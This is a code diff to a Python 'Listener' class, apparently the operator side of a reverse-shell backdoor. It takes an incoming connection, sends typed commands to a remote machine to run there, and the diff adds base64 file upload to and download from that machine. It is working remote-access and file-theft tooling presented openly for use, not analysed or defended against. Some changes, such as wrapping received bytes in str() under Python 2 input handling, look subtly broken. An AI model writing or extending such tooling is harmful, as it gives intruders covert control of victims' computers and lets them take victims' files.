@@ -1,6 +1,7 @@
-#!usr/bin/python
+#!usr/bin/env python
 import socket
 import json
+import base64
 
 
 class Listener:
@@ -11,7 +12,7 @@ class Listener:
         listener.listen(0)
         print("[+] Waiting for incoming connection")
         self.connection, address = listener.accept()
-        print("[+] Got a connection form" + str(address))
+        print("[+] Got a connection from" + str(address))
 
     def reliable_send(self, data):
         json_data = json.dumps(data)
@@ -21,7 +22,7 @@ class Listener:
         json_data = ""
         while True:
             try:
-                json_data = json_data + self.connection.recv(1024)
+                json_data = json_data + str(self.connection.recv(1024))
                 return json.loads(json_data)
             except ValueError:
                 continue
@@ -35,19 +36,31 @@ class Listener:
 
         return self.reliable_receive()
 
+    def read_file(self, path):
+        with open(path, "rb") as file:
+            return base64.b64encode(file.read())
+
     def write_file(self, path, content):
         with open(path, "wb") as file:
-            file.write(content)
+            file.write(base64.b64decode(content))
             return "[+] Download successful."
 
     def run(self):
         while True:
             command = raw_input(">> ")
             command = command.split(" ")
-            result = self.execute_remotely(command)
 
-            if command[0] == "download":
-                result = self.write_file(command[1], result)
+            try:
+                if command[0] == "upload":
+                    file_content = self.read_file(command[1])
+                    command.append(file_content)
+
+                result = self.execute_remotely(command)
+
+                if command[0] == "download" and "[-] Error " not in result:
+                    result = self.write_file(command[1], result)
+            except Exception:
+                result = "[-] Error during command execution."
             print(result)
 
 
